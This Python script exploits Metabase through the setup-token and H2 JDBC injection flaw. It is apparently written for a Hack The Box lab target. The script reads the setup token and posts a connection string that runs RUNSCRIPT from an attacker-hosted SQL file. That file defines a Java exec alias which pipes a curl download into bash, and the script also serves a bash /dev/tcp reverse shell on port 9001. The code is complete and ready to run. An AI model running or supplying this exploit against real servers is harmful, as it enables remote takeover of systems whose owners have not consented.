import requests
from threading import Thread
from http.server import HTTPServer, BaseHTTPRequestHandler
from socket import socket, AF_INET, SOCK_DGRAM, inet_ntoa
from struct import pack
from fcntl import ioctl


def get_token_and_version(url):
    """Get the setup token and version information from the Metabase instance."""
    r = requests.get(f"{url}/api/session/properties", verify=False)
    data = r.json()
    version = data.get("version")
    token = data.get("setup-token")
    print(f"Version: {version}")
    print(f"Token: {token}")

    return token


def get_lhost():
    """Get the local host IP address associated with the 'tun0' interface."""
    sock = socket(AF_INET, SOCK_DGRAM)
    packed_addr = ioctl(sock.fileno(), 0x8915, pack("256s", b"tun0"))[20:24]
    lhost = inet_ntoa(packed_addr)
    print(f"LHOST: {lhost}")

    return lhost


def host_payload(local_port, files):
    """Create an HTTP server to host payload files."""
    class HostHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path.lstrip("/") in files.keys():
                payload = files[self.path.lstrip("/")]
                content_type = "application/octet-stream"
            else:
                self.send_error(404, "Not Found")
                return

            self.send_response(200)
            self.send_header("Content-type", content_type)
            self.send_header("Content-Length", len(payload))
            self.end_headers()
            self.wfile.write(payload)

    httpd = HTTPServer(("", local_port), HostHandler)

    return httpd


def rce(url, token):
    """Perform Remote Code Execution (RCE) on the Metabase instance."""
    payload = {
        "token": token,
        "details": {
            "is_on_demand": False,
            "is_full_sync": False,
            "is_sample": False,
            "cache_ttl": None,
            "refingerprint": False,
            "auto_run_queries": True,
            "schedules": {},
            "details": {
                "db": f"mem:;ıNIT=RUNSCRIPT FROM 'http://10.10.14.80:8000/poc.sql'//\;",
                "advanced-options": False,
                "ssl": True
            },
            "name": "nitro",
            "engine": "h2"
        }
    }

    response = requests.post(f"{url}/api/setup/validate", json=payload, verify=False)
    print(response.text)


def main():
    url = "http://metabase.apethanto.htb"
    lhost = get_lhost()
    lport = 8000
    token = get_token_and_version(url)

    # Define payload files to be hosted
    files = {}
    files["poc.sql"] = f"CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {{Runtime.getRuntime().exec(cmd);return \"a\";}}';CALL EXEC ('bash -c {{curl,{lhost}:{lport}/payload}}|{{bash,-i}}')".encode()
    files["payload"] = f"bash -c 'bash -i >& /dev/tcp/{lhost}/9001 0>&1'".encode()

    # Separate thread for hosting payloads
    httpd = host_payload(lport, files)
    httpd_thread = Thread(target=httpd.serve_forever)
    httpd_thread.start()

    # 💥
    rce(url, token)


if __name__ == "__main__":
    main()
